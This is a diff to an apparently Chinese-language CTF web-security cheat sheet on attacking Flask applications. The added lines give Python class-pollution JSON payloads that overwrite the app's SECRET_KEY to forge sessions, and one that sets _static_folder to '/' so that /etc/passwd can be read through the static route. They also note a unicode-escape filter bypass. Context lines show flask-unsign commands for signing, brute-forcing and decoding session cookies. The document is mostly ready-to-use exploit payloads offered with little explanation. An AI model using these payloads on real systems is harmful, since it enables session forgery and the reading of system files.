@@ -1,3 +1,7 @@
+- uncicode 绕过 `\u0069`
+- [原型链](#原型链污染)覆盖 SECRET_KEY , session 伪造
+- 原型链覆盖 `_static_folder` , 访问 /static/etc/passwd
+
 ## flask session
 
 需要得到 secret,
@@ -8,6 +12,42 @@ flask-unsign --sign --cookie "{'balance': 666666}" --secret "XMM<XMK"
 
 flask-unsign --unsign --cookie "eyJ1c2VyIjoiaWRkbm0ifQ.YyVDmQ.nXit643ch5T34u092IJSngKbCwI" --wordlist dict.txt
 flask-unsign --decode --cookie "eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8"
+```
+
+## 原型链污染
+
+覆盖 SECRET_KEY, 然后伪造 session
+
+```json
+{
+  "__init\u005f_": {
+    "__globals\u005f_": {
+      "app": {
+        "config": {
+          "SECRET_KEY": "aaa"
+        }
+      }
+    }
+  },
+  "username": 1,
+  "password": 1
+}
+```
+
+覆盖 SECRET_KEY, 然后读 http://x.x/static/etc/passwd
+
+```json
+{
+  "username": "test",
+  "password": "test",
+  "__init\u005f_": {
+    "__globals__": {
+      "app": {
+        "_static_folder": "/"
+      }
+    }
+  }
+}
 ```
 
 ## flask 原型链污染获取 PIN 码
